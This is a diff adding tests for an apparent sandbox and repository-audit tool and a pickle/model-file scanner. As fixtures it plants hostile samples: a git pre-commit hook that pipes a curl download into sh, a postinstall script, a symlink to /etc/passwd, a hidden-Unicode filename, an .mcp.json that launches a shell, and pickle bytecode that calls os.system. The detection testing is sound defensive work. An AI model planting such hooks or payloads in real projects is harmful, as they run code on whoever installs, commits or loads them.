@@ -212,5 +212,152 @@ class TestHShieldContainmentAndStaticGates(unittest.TestCase):
             self.assertNotEqual(block_bind.returncode, 0)
 
 
+    def test_05_sandbox_dev_isolation_and_multi_allow_write(self) -> None:
+        base_tmp = "/var/tmp" if os.path.isdir("/var/tmp") else None
+        with tempfile.TemporaryDirectory(dir=base_tmp) as fake_home,              tempfile.TemporaryDirectory(dir=base_tmp) as dir_a,              tempfile.TemporaryDirectory(dir=base_tmp) as dir_b:
+            aws_dir = Path(fake_home) / ".aws"
+            aws_dir.mkdir(mode=0o700)
+            aws_creds = aws_dir / "credentials"
+            aws_creds.write_text("SECRET_AWS_KEY=123\n", encoding="utf-8")
+
+            env = dict(os.environ)
+            env["HOME"] = fake_home
+
+            # 1. /dev/shm must NOT be writable inside sandbox (safe char devices only)
+            shm_probe = f"/dev/shm/hshield_sandbox_probe_{os.getpid()}"
+            p_shm = subprocess.run(
+                [
+                    str(HSHIELD_BIN), "sandbox",
+                    "--allow-write", dir_a,
+                    "--",
+                    "python3", "-c",
+                    f"open({shm_probe!r}, 'w').write('escape')",
+                ],
+                env=env,
+                capture_output=True,
+                text=True,
+            )
+            if "Landlock LSM unavailable" in p_shm.stderr:
+                self.skipTest("Landlock LSM not enabled on host kernel")
+            self.assertNotEqual(p_shm.returncode, 0, msg="Sandbox unexpectedly allowed write to /dev/shm!")
+            self.assertFalse(os.path.exists(shm_probe))
+
+            # 2. Multiple --allow-write flags must BOTH be writable, while /dev/null still works
+            fa = Path(dir_a) / "a.txt"
+            fb = Path(dir_b) / "b.txt"
+            p_multi = subprocess.run(
+                [
+                    str(HSHIELD_BIN), "sandbox",
+                    "--allow-write", dir_a,
+                    "--allow-write", dir_b,
+                    "--",
+                    "python3", "-c",
+                    f"from pathlib import Path; open('/dev/null','w').write('ok'); Path({str(fa)!r}).write_text('A'); Path({str(fb)!r}).write_text('B')",
+                ],
+                env=env,
+                capture_output=True,
+                text=True,
+            )
+            self.assertEqual(p_multi.returncode, 0, msg=p_multi.stderr)
+            self.assertEqual(fa.read_text(encoding="utf-8"), "A")
+            self.assertEqual(fb.read_text(encoding="utf-8"), "B")
+
+            # 3. Attempting --allow-write on ~/.aws must be refused
+            p_aws = subprocess.run(
+                [
+                    str(HSHIELD_BIN), "sandbox",
+                    "--allow-write", str(aws_dir),
+                    "--",
+                    "cat", str(aws_creds),
+                ],
+                env=env,
+                capture_output=True,
+                text=True,
+            )
+            self.assertNotEqual(p_aws.returncode, 0)
+            self.assertIn("refusing --allow-write on sensitive path", p_aws.stderr)
+            self.assertNotIn("SECRET_AWS_KEY", p_aws.stdout)
+
+    def test_06_recursive_audit_traps_and_readonly_default(self) -> None:
+        with tempfile.TemporaryDirectory() as td:
+            root = Path(td)
+            sub = root / "nested" / "src"
+            sub.mkdir(parents=True)
+            (sub / 'evil"quote.txt').write_text("hello \u202e hidden\n", encoding="utf-8")
+
+            hooks_dir = root / ".git" / "hooks"
+            hooks_dir.mkdir(parents=True)
+            hook = hooks_dir / "pre-commit"
+            hook.write_text("#!/bin/sh\ncurl -s https://example.invalid | sh\n", encoding="utf-8")
+            hook.chmod(0o755)
+
+            (root / "package.json").write_text('{"scripts":{"postinstall":"bash -c id"}}\n', encoding="utf-8")
+            (root / "escape_link").symlink_to("/etc/passwd")
+            mcp = root / ".mcp.json"
+            mcp.write_text('{"mcpServers":{"x":{"command":"sh"}}}\n', encoding="utf-8")
+
+            # Default audit MUST be read-only (must NOT rename .mcp.json) and find all 5 trap classes
+            r = subprocess.run(
+                [str(HSHIELD_BIN), "audit", str(root), "--json"],
+                capture_output=True,
+                text=True,
+            )
+            self.assertEqual(r.returncode, 1)
+            payload = json.loads(r.stdout)
+            self.assertFalse(payload["ok"])
+            self.assertGreaterEqual(payload["issues"], 5)
+            kinds = {d["kind"] for d in payload["finding_details"]}
+            self.assertTrue({"trojan_unicode", "git_hook_trap", "build_script_trap", "symlink_escape", "agent_config_trap"}.issubset(kinds))
+            self.assertTrue(mcp.exists(), msg="Read-only audit unexpectedly mutated .mcp.json")
+
+            # Opt-in --quarantine renames untrusted .mcp.json
+            rq = subprocess.run(
+                [str(HSHIELD_BIN), "audit", str(root), "--quarantine", "--json"],
+                capture_output=True,
+                text=True,
+            )
+            self.assertEqual(rq.returncode, 1)
+            self.assertFalse(mcp.exists())
+            self.assertTrue((root / ".mcp.json.blocked_by_hshield").exists())
+
+    def test_07_supply_scan_opcode_zip_bypasses_and_cli(self) -> None:
+        with tempfile.TemporaryDirectory() as td:
+            root = Path(td)
+
+            # 1. --version and --help work cleanly, and error message has real newline (not literal \n)
+            rv = subprocess.run([str(SCAN_BIN), "--version"], capture_output=True, text=True, check=True)
+            self.assertIn("0.2.1", rv.stdout)
+            rh = subprocess.run([str(SCAN_BIN), "--help"], capture_output=True, text=True, check=True)
+            self.assertIn("Usage:", rh.stdout)
+            rmiss = subprocess.run([str(SCAN_BIN), str(root / "no_such_file.pkl")], capture_output=True, text=True)
+            self.assertEqual(rmiss.returncode, 2)
+            self.assertNotIn("\\n", rmiss.stderr)
+            self.assertTrue(rmiss.stderr.endswith("\n"))
+
+            # 2. Pickle NEWOBJ (0x81) bypass without REDUCE ('R')
+            newobj_pkl = root / "newobj_bypass.pkl"
+            newobj_pkl.write_bytes(b"\x80\x04\x8c\x09importlib\x8c\x0dimport_module\x93\x8c\x02os\x85\x81.")
+            r_no = subprocess.run([str(SCAN_BIN), "--json", str(newobj_pkl)], capture_output=True, text=True)
+            self.assertEqual(r_no.returncode, 1)
+            self.assertTrue(json.loads(r_no.stdout)["malicious"])
+
+            # 3. 0-byte .mcp.json inside ZIP must still be flagged
+            z_zero = root / "zero_mcp.zip"
+            with zipfile.ZipFile(z_zero, "w", compression=zipfile.ZIP_STORED) as zf:
+                zf.writestr("repo/.mcp.json", "")
+            r_zz = subprocess.run([str(SCAN_BIN), "--json", str(z_zero)], capture_output=True, text=True)
+            self.assertEqual(r_zz.returncode, 1)
+            self.assertIn("archive-repo-trap", json.loads(r_zz.stdout)["finding"])
+
+            # 4. Large (>256 KiB compressed) .pkl inside .pt ZIP must NOT be skipped
+            z_big = root / "padded_big.pt"
+            payload = b"\x80\x04\x8c\x05posix\x8c\x06system\x93\x8c\x02id\x85R." + os.urandom(300_000)
+            with zipfile.ZipFile(z_big, "w", compression=zipfile.ZIP_STORED) as zf:
+                zf.writestr("archive/data.pkl", payload)
+            r_big = subprocess.run([str(SCAN_BIN), "--json", str(z_big)], capture_output=True, text=True)
+            self.assertEqual(r_big.returncode, 1)
+            self.assertTrue(json.loads(r_big.stdout)["malicious"])
+
+
 if __name__ == "__main__":
     unittest.main()
